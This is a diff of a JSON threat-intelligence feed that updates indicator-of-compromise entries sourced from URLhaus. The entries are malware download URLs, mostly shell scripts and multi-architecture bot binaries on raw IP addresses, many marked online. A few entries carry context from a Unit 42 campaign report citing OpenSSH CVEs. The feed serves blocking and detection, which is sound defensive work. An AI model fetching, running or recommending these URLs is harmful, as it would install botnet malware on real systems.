@@ -1,5 +1,5 @@
 {
-  "last_updated_utc": "2026-08-22T01:13:34.368840+00:00",
+  "last_updated_utc": "2026-08-22T02:55:29.440630+00:00",
   "structured_iocs": [
     {
       "value": "162.243.103.246",
@@ -72,6 +72,234 @@
       "country": "JP"
     },
     {
+      "value": "http://182.119.205.237:56896/bin.sh",
+      "type": "url",
+      "threat": "2026-08-22 02:46:08",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3906691/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-22 02:46:08",
+      "status": "online"
+    },
+    {
+      "value": "http://182.114.199.146:39260/i",
+      "type": "url",
+      "threat": "2026-08-22 02:19:26",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3906690/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-22 02:19:26",
+      "status": "online"
+    },
+    {
+      "value": "http://222.223.152.97:800/wget.sh",
+      "type": "url",
+      "threat": "2026-08-22 02:02:28",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3906689/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-22 02:02:28",
+      "status": "online"
+    },
+    {
+      "value": "http://222.223.152.97:800/m.mipsel",
+      "type": "url",
+      "threat": "2026-08-22 02:01:32",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3906688/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-22 02:01:32",
+      "status": "online"
+    },
+    {
+      "value": "http://222.223.152.97:800/m.armv5l",
+      "type": "url",
+      "threat": "2026-08-22 02:01:30",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3906687/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-22 02:01:30",
+      "status": "online"
+    },
+    {
+      "value": "http://222.223.152.97:800/lilin.sh",
+      "type": "url",
+      "threat": "2026-08-22 02:01:29",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3906677/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-22 02:01:29",
+      "status": "online"
+    },
+    {
+      "value": "http://222.223.152.97:800/m.mips",
+      "type": "url",
+      "threat": "2026-08-22 02:01:29",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3906678/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-22 02:01:29",
+      "status": "online"
+    },
+    {
+      "value": "http://222.223.152.97:800/m.i686",
+      "type": "url",
+      "threat": "2026-08-22 02:01:29",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3906679/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-22 02:01:29",
+      "status": "online"
+    },
+    {
+      "value": "http://222.223.152.97:800/m.x86_64",
+      "type": "url",
+      "threat": "2026-08-22 02:01:29",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3906680/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-22 02:01:29",
+      "status": "online"
+    },
+    {
+      "value": "http://222.223.152.97:800/m.armv4l",
+      "type": "url",
+      "threat": "2026-08-22 02:01:29",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3906681/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-22 02:01:29",
+      "status": "online"
+    },
+    {
+      "value": "http://222.223.152.97:800/m.armv7l",
+      "type": "url",
+      "threat": "2026-08-22 02:01:29",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3906682/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-22 02:01:29",
+      "status": "online"
+    },
+    {
+      "value": "http://222.223.152.97:800/m.armv6l",
+      "type": "url",
+      "threat": "2026-08-22 02:01:29",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3906683/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-22 02:01:29",
+      "status": "online"
+    },
+    {
+      "value": "http://222.223.152.97:800/m.i486",
+      "type": "url",
+      "threat": "2026-08-22 02:01:29",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3906684/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-22 02:01:29",
+      "status": "online"
+    },
+    {
+      "value": "http://222.223.152.97:800/m.powerpc",
+      "type": "url",
+      "threat": "2026-08-22 02:01:29",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3906685/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-22 02:01:29",
+      "status": "online"
+    },
+    {
+      "value": "http://222.223.152.97:800/m.i586",
+      "type": "url",
+      "threat": "2026-08-22 02:01:29",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3906686/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-22 02:01:29",
+      "status": "online"
+    },
+    {
+      "value": "http://222.136.52.188:32973/i",
+      "type": "url",
+      "threat": "2026-08-22 01:52:07",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3906676/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-22 01:52:07",
+      "status": "online"
+    },
+    {
+      "value": "http://42.4.17.29:54916/i",
+      "type": "url",
+      "threat": "2026-08-22 01:49:14",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3906675/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-22 01:49:14",
+      "status": "online"
+    },
+    {
+      "value": "http://115.49.210.219:38645/i",
+      "type": "url",
+      "threat": "2026-08-22 02:24:12",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3906674/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-22 01:48:11",
+      "status": "online"
+    },
+    {
+      "value": "http://115.49.210.219:38645/bin.sh",
+      "type": "url",
+      "threat": "2026-08-22 01:56:52",
+      "source": "URLhaus",
+      "source_url": "https://urlhaus.abuse.ch/url/3906673/",
+      "tags": [
+        "malware_download"
+      ],
+      "first_seen": "2026-08-22 01:24:21",
+      "status": "online"
+    },
+    {
       "value": "http://163.142.94.45:36545/bin.sh",
       "type": "url",
       "threat": "2026-08-22 01:06:21",
@@ -81,7 +309,7 @@
         "malware_download"
       ],
       "first_seen": "2026-08-22 01:06:21",
-      "status": "online"
+      "status": "offline"
     },
     {
       "value": "http://115.54.128.38:41331/i",
@@ -98,7 +326,7 @@
     {
       "value": "http://123.7.223.208:48157/i",
       "type": "url",
-      "threat": "2026-08-22 00:41:15",
+      "threat": "2026-08-22 02:48:36",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906671/",
       "tags": [
@@ -110,7 +338,7 @@
     {
       "value": "http://123.7.223.208:48157/bin.sh",
       "type": "url",
-      "threat": "2026-08-22 00:27:21",
+      "threat": "2026-08-22 02:47:33",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906669/",
       "tags": [
@@ -134,14 +362,14 @@
     {
       "value": "http://116.138.108.78:35117/i",
       "type": "url",
-      "threat": "",
+      "threat": "2026-08-22 02:04:00",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906667/",
       "tags": [
         "malware_download"
       ],
       "first_seen": "2026-08-21 23:46:31",
-      "status": "offline"
+      "status": "online"
     },
     {
       "value": "http://182.116.20.77:59128/i",
@@ -182,7 +410,7 @@
     {
       "value": "http://116.138.108.78:35117/bin.sh",
       "type": "url",
-      "threat": "2026-08-21 23:10:22",
+      "threat": "2026-08-22 02:03:01",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906663/",
       "tags": [
@@ -194,7 +422,7 @@
     {
       "value": "http://123.132.158.53:41696/i",
       "type": "url",
-      "threat": "2026-08-21 23:05:20",
+      "threat": "2026-08-22 02:29:55",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906662/",
       "tags": [
@@ -218,7 +446,7 @@
     {
       "value": "http://182.116.20.77:59128/bin.sh",
       "type": "url",
-      "threat": "2026-08-21 22:45:25",
+      "threat": "2026-08-22 02:08:59",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906660/",
       "tags": [
@@ -230,7 +458,7 @@
     {
       "value": "http://123.132.158.53:41696/bin.sh",
       "type": "url",
-      "threat": "2026-08-21 22:29:13",
+      "threat": "2026-08-22 02:01:34",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906659/",
       "tags": [
@@ -242,7 +470,7 @@
     {
       "value": "http://42.235.183.167:47451/i",
       "type": "url",
-      "threat": "2026-08-21 22:26:13",
+      "threat": "2026-08-22 02:44:45",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906658/",
       "tags": [
@@ -273,12 +501,12 @@
         "malware_download"
       ],
       "first_seen": "2026-08-21 21:55:13",
-      "status": "online"
+      "status": "offline"
     },
     {
       "value": "http://179.108.90.55:37440/i",
       "type": "url",
-      "threat": "2026-08-21 21:52:22",
+      "threat": "2026-08-22 02:44:28",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906655/",
       "tags": [
@@ -297,7 +525,7 @@
         "malware_download"
       ],
       "first_seen": "2026-08-21 21:52:19",
-      "status": "online"
+      "status": "offline"
     },
     {
       "value": "http://62.60.226.140/files/6680549914/ENKpzg6.exe",
@@ -314,7 +542,7 @@
     {
       "value": "http://123.8.30.116:41163/i",
       "type": "url",
-      "threat": "2026-08-21 21:46:23",
+      "threat": "2026-08-22 02:14:44",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906652/",
       "tags": [
@@ -326,7 +554,7 @@
     {
       "value": "http://179.108.90.55:37440/bin.sh",
       "type": "url",
-      "threat": "2026-08-21 21:23:15",
+      "threat": "2026-08-22 02:48:17",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906651/",
       "tags": [
@@ -350,7 +578,7 @@
     {
       "value": "http://105.158.197.238:53233/i",
       "type": "url",
-      "threat": "2026-08-21 21:11:09",
+      "threat": "2026-08-22 01:57:06",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906649/",
       "tags": [
@@ -374,7 +602,7 @@
     {
       "value": "http://112.248.60.89:60712/i",
       "type": "url",
-      "threat": "2026-08-21 20:57:34",
+      "threat": "2026-08-22 02:37:39",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906647/",
       "tags": [
@@ -417,7 +645,7 @@
         "malware_download"
       ],
       "first_seen": "2026-08-21 20:21:07",
-      "status": "online"
+      "status": "offline"
     },
     {
       "value": "http://123.8.162.45:59164/bin.sh",
@@ -429,12 +657,12 @@
         "malware_download"
       ],
       "first_seen": "2026-08-21 20:21:07",
-      "status": "online"
+      "status": "offline"
     },
     {
       "value": "http://85.15.117.156:37936/i",
       "type": "url",
-      "threat": "2026-08-21 20:14:15",
+      "threat": "2026-08-22 02:37:28",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906642/",
       "tags": [
@@ -470,7 +698,7 @@
     {
       "value": "http://85.15.117.156:37936/bin.sh",
       "type": "url",
-      "threat": "2026-08-21 21:16:31",
+      "threat": "2026-08-22 02:03:05",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906639/",
       "tags": [
@@ -501,7 +729,7 @@
         "malware_download"
       ],
       "first_seen": "2026-08-21 19:06:13",
-      "status": "online"
+      "status": "offline"
     },
     {
       "value": "http://42.177.103.199:46495/bin.sh",
@@ -513,7 +741,7 @@
         "malware_download"
       ],
       "first_seen": "2026-08-21 18:50:19",
-      "status": "online"
+      "status": "offline"
     },
     {
       "value": "http://220.192.234.145:55381/i",
@@ -542,7 +770,7 @@
     {
       "value": "http://182.116.51.119:37449/bin.sh",
       "type": "url",
-      "threat": "2026-08-21 21:42:41",
+      "threat": "2026-08-22 02:11:31",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906632/",
       "tags": [
@@ -585,7 +813,7 @@
         "malware_download"
       ],
       "first_seen": "2026-08-21 18:04:24",
-      "status": "online"
+      "status": "offline"
     },
     {
       "value": "http://58.208.16.203:3588/bin.sh",
@@ -597,7 +825,7 @@
         "malware_download"
       ],
       "first_seen": "2026-08-21 17:56:09",
-      "status": "online"
+      "status": "offline"
     },
     {
       "value": "http://58.208.16.203:3588/i",
@@ -614,7 +842,7 @@
     {
       "value": "http://124.131.166.85:34514/i",
       "type": "url",
-      "threat": "2026-08-21 21:06:05",
+      "threat": "2026-08-22 02:12:52",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906627/",
       "tags": [
@@ -650,14 +878,14 @@
     {
       "value": "http://113.221.25.94:37532/bin.sh",
       "type": "url",
-      "threat": "2026-08-21 16:43:19",
+      "threat": "2026-08-22 02:18:13",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906624/",
       "tags": [
         "malware_download"
       ],
       "first_seen": "2026-08-21 16:43:19",
-      "status": "offline"
+      "status": "online"
     },
     {
       "value": "http://115.49.64.122:48159/i",
@@ -669,7 +897,7 @@
         "malware_download"
       ],
       "first_seen": "2026-08-21 16:18:16",
-      "status": "online"
+      "status": "offline"
     },
     {
       "value": "http://125.112.59.91:60395/i",
@@ -722,19 +950,19 @@
     {
       "value": "http://125.112.59.91:60395/bin.sh",
       "type": "url",
-      "threat": "2026-08-21 14:43:28",
+      "threat": "2026-08-22 01:59:50",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906618/",
       "tags": [
         "malware_download"
       ],
       "first_seen": "2026-08-21 14:43:28",
-      "status": "offline"
+      "status": "online"
     },
     {
       "value": "http://61.137.251.126:60468/bin.sh",
       "type": "url",
-      "threat": "2026-08-21 20:57:17",
+      "threat": "2026-08-22 02:00:38",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906617/",
       "tags": [
@@ -746,7 +974,7 @@
     {
       "value": "http://117.26.82.102:41542/i",
       "type": "url",
-      "threat": "2026-08-21 21:12:35",
+      "threat": "2026-08-22 02:49:39",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906616/",
       "tags": [
@@ -758,7 +986,7 @@
     {
       "value": "http://31.4.254.241:52598/bin.sh",
       "type": "url",
-      "threat": "2026-08-21 21:43:21",
+      "threat": "2026-08-22 02:39:13",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906615/",
       "tags": [
@@ -782,7 +1010,7 @@
     {
       "value": "http://61.52.158.83:45555/i",
       "type": "url",
-      "threat": "2026-08-21 21:21:44",
+      "threat": "2026-08-22 02:42:53",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906613/",
       "tags": [
@@ -794,19 +1022,19 @@
     {
       "value": "http://115.201.178.159:48639/i",
       "type": "url",
-      "threat": "2026-08-21 14:01:27",
+      "threat": "2026-08-22 01:57:15",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906612/",
       "tags": [
         "malware_download"
       ],
       "first_seen": "2026-08-21 14:01:27",
-      "status": "offline"
+      "status": "online"
     },
     {
       "value": "http://42.59.235.202:51478/i",
       "type": "url",
-      "threat": "2026-08-21 20:11:15",
+      "threat": "2026-08-22 02:47:28",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906611/",
       "tags": [
@@ -842,7 +1070,7 @@
     {
       "value": "http://61.52.158.83:45555/bin.sh",
       "type": "url",
-      "threat": "2026-08-21 21:09:17",
+      "threat": "2026-08-22 02:03:01",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906608/",
       "tags": [
@@ -878,19 +1106,19 @@
     {
       "value": "http://163.142.87.19:46712/bin.sh",
       "type": "url",
-      "threat": "2026-08-21 14:26:44",
+      "threat": "2026-08-22 02:46:52",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906605/",
       "tags": [
         "malware_download"
       ],
       "first_seen": "2026-08-21 13:14:15",
-      "status": "offline"
+      "status": "online"
     },
     {
       "value": "http://125.42.237.221:39602/i",
       "type": "url",
-      "threat": "2026-08-21 20:26:48",
+      "threat": "2026-08-22 02:08:45",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906604/",
       "tags": [
@@ -902,7 +1130,7 @@
     {
       "value": "http://222.142.244.196:59371/i",
       "type": "url",
-      "threat": "2026-08-21 21:29:10",
+      "threat": "2026-08-22 02:21:18",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906603/",
       "tags": [
@@ -938,7 +1166,7 @@
     {
       "value": "http://222.142.244.196:59371/bin.sh",
       "type": "url",
-      "threat": "2026-08-21 20:41:07",
+      "threat": "2026-08-22 02:02:57",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906600/",
       "tags": [
@@ -962,7 +1190,7 @@
     {
       "value": "http://182.116.20.246:39870/bin.sh",
       "type": "url",
-      "threat": "2026-08-21 21:29:10",
+      "threat": "2026-08-22 02:19:10",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906598/",
       "tags": [
@@ -1334,7 +1562,7 @@
     {
       "value": "http://94.154.43.85/ppc64",
       "type": "url",
-      "threat": "2026-08-21 20:42:52",
+      "threat": "2026-08-22 02:33:28",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906560/",
       "tags": [
@@ -1346,7 +1574,7 @@
     {
       "value": "http://94.154.43.85/x86",
       "type": "url",
-      "threat": "2026-08-21 20:25:39",
+      "threat": "2026-08-22 01:57:48",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906561/",
       "tags": [
@@ -1358,7 +1586,7 @@
     {
       "value": "http://94.154.43.85/amd64",
       "type": "url",
-      "threat": "2026-08-21 21:14:09",
+      "threat": "2026-08-22 01:57:02",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906562/",
       "tags": [
@@ -1370,7 +1598,7 @@
     {
       "value": "http://94.154.43.85/armv7l",
       "type": "url",
-      "threat": "2026-08-21 20:06:21",
+      "threat": "2026-08-22 02:17:04",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906563/",
       "tags": [
@@ -1382,7 +1610,7 @@
     {
       "value": "http://94.154.43.85/mipsel",
       "type": "url",
-      "threat": "2026-08-21 20:58:57",
+      "threat": "2026-08-22 02:41:30",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906564/",
       "tags": [
@@ -1430,7 +1658,7 @@
     {
       "value": "http://94.154.43.210/arm5",
       "type": "url",
-      "threat": "2026-08-21 20:18:45",
+      "threat": "2026-08-22 02:06:54",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906559/",
       "tags": [
@@ -1442,7 +1670,7 @@
     {
       "value": "http://94.154.43.210/spc",
       "type": "url",
-      "threat": "2026-08-21 20:38:37",
+      "threat": "2026-08-22 02:13:06",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906558/",
       "tags": [
@@ -1466,7 +1694,7 @@
     {
       "value": "http://94.154.43.210/m68k",
       "type": "url",
-      "threat": "2026-08-21 21:19:58",
+      "threat": "2026-08-22 02:14:10",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906556/",
       "tags": [
@@ -1514,7 +1742,7 @@
     {
       "value": "http://94.154.43.210/arm6",
       "type": "url",
-      "threat": "2026-08-21 20:22:05",
+      "threat": "2026-08-22 02:01:58",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906550/",
       "tags": [
@@ -1526,7 +1754,7 @@
     {
       "value": "http://94.154.43.210/mips",
       "type": "url",
-      "threat": "2026-08-21 20:36:51",
+      "threat": "2026-08-22 02:17:34",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906551/",
       "tags": [
@@ -1574,7 +1802,7 @@
     {
       "value": "http://94.154.43.210/adbpersist.arm7",
       "type": "url",
-      "threat": "2026-08-21 21:08:25",
+      "threat": "2026-08-22 02:37:49",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906555/",
       "tags": [
@@ -1610,7 +1838,7 @@
     {
       "value": "http://94.154.43.181/bot.arm",
       "type": "url",
-      "threat": "2026-08-21 20:34:38",
+      "threat": "2026-08-22 02:41:34",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906540/",
       "tags": [
@@ -1622,7 +1850,7 @@
     {
       "value": "http://94.154.43.181/bot.i686",
       "type": "url",
-      "threat": "2026-08-21 20:42:45",
+      "threat": "2026-08-22 02:22:51",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906541/",
       "tags": [
@@ -1634,241 +1862,13 @@
     {
       "value": "http://94.154.43.181/bot.aarch64",
       "type": "url",
-      "threat": "2026-08-21 21:04:38",
+      "threat": "2026-08-22 02:40:01",
       "source": "URLhaus",
       "source_url": "https://urlhaus.abuse.ch/url/3906542/",
       "tags": [
         "malware_download"
       ],
       "first_seen": "2026-08-21 11:28:21",
-      "status": "online"
-    },
-    {
-      "value": "http://94.154.43.181/bot.ppc",
-      "type": "url",
-      "threat": "2026-08-21 21:43:27",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3906543/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-21 11:28:21",
-      "status": "online"
-    },
-    {
-      "value": "http://94.154.43.181/bot.mipsel",
-      "type": "url",
-      "threat": "2026-08-21 20:05:52",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3906544/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-21 11:28:21",
-      "status": "online"
-    },
-    {
-      "value": "http://94.154.43.181/bot.arm7",
-      "type": "url",
-      "threat": "2026-08-21 21:11:15",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3906545/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-21 11:28:21",
-      "status": "online"
-    },
-    {
-      "value": "http://94.154.43.181/bot.sh4",
-      "type": "url",
-      "threat": "2026-08-21 20:03:37",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3906546/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-21 11:28:21",
-      "status": "online"
-    },
-    {
-      "value": "http://42.231.79.131:52303/i",
-      "type": "url",
-      "threat": "2026-08-21 21:47:04",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3906537/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-21 11:23:16",
-      "status": "online"
-    },
-    {
-      "value": "http://123.132.182.114:59660/i",
-      "type": "url",
-      "threat": "2026-08-21 20:46:52",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3906536/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-21 11:23:15",
-      "status": "online"
-    },
-    {
-      "value": "https://nimblenumbers.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe",
-      "type": "url",
-      "threat": "2026-08-21 14:18:25",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3906535/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-21 11:14:16",
-      "status": "offline"
-    },
-    {
-      "value": "http://113.228.140.10:33110/i",
-      "type": "url",
-      "threat": "2026-08-21 21:31:04",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3906534/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-21 11:08:22",
-      "status": "online"
-    },
-    {
-      "value": "http://125.47.59.152:33986/i",
-      "type": "url",
-      "threat": "2026-08-21 11:06:15",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3906533/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-21 11:06:15",
-      "status": "offline"
-    },
-    {
-      "value": "http://123.132.182.114:59660/bin.sh",
-      "type": "url",
-      "threat": "2026-08-21 21:51:22",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3906532/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-21 10:51:20",
-      "status": "online"
-    },
-    {
-      "value": "http://42.235.49.187:35712/i",
-      "type": "url",
-      "threat": "2026-08-21 14:23:48",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3906531/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-21 10:42:10",
-      "status": "offline"
-    },
-    {
-      "value": "http://124.234.219.153:60517/bin.sh",
-      "type": "url",
-      "threat": "2026-08-21 14:08:25",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3906530/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-21 10:38:31",
-      "status": "offline"
-    },
-    {
-      "value": "http://125.47.59.152:33986/bin.sh",
-      "type": "url",
-      "threat": "2026-08-21 10:37:13",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3906529/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-21 10:37:13",
-      "status": "offline"
-    },
-    {
-      "value": "http://176.65.139.202/daredevil.powerpc",
-      "type": "url",
-      "threat": "2026-08-21 14:28:13",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3906528/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-21 10:31:16",
-      "status": "offline"
-    },
-    {
-      "value": "http://176.65.139.202/daredevil.armv5l",
-      "type": "url",
-      "threat": "2026-08-21 21:12:14",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3906527/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-21 10:31:15",
-      "status": "online"
-    },
-    {
-      "value": "http://176.65.139.202/daredevil.mips",
-      "type": "url",
-      "threat": "2026-08-21 20:23:21",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3906526/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-21 10:31:14",
-      "status": "online"
-    },
-    {
-      "value": "http://176.65.139.202/daredevil.armv7l",
-      "type": "url",
-      "threat": "2026-08-21 20:07:14",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3906525/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-21 10:31:13",
-      "status": "online"
-    },
-    {
-      "value": "http://176.65.139.202/daredevil.x86_64",
-      "type": "url",
-      "threat": "2026-08-21 19:57:15",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3906514/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-21 10:30:25",
-      "status": "online"
-    },
-    {
-      "value": "http://176.65.139.202/daredevil.armv6l",
-      "type": "url",
-      "threat": "2026-08-21 21:04:09",
-      "source": "URLhaus",
-      "source_url": "https://urlhaus.abuse.ch/url/3906515/",
-      "tags": [
-        "malware_download"
-      ],
-      "first_seen": "2026-08-21 10:30:25",
       "status": "online"
     },
     {
@@ -4430,7 +4430,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-22T01:13:31.373623+00:00",
+      "article_date": "2026-08-22T02:55:26.380560+00:00",
       "context": "at ENIBot targets. \r\n\r\nIOCs:\r\nMalicious Hashes (Examples):\r\n13336d8e6fcda501cf62955c223ba4745cb46adf58f466ce6fa52f3b9d1d"
     },
     {
@@ -4439,7 +4439,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-22T01:13:31.373623+00:00",
+      "article_date": "2026-08-22T02:55:26.380560+00:00",
       "context": "ies from old OpenSSH versions including CVE-2023-28531(severity:9.8), CVE-2024-6387(severity:8"
     },
     {
@@ -4448,7 +4448,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-22T01:13:31.373623+00:00",
+      "article_date": "2026-08-22T02:55:26.380560+00:00",
       "context": "including CVE-2023-28531(severity:9.8), CVE-2024-6387(severity:8.1) and CVE-2024-41996 (sever"
     },
     {
@@ -4457,7 +4457,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-22T01:13:31.373623+00:00",
+      "article_date": "2026-08-22T02:55:26.380560+00:00",
       "context": "y:9.8), CVE-2024-6387(severity:8.1) and CVE-2024-41996 (severity:7.5). \r\n- These vulnerabiliti"
     },
     {
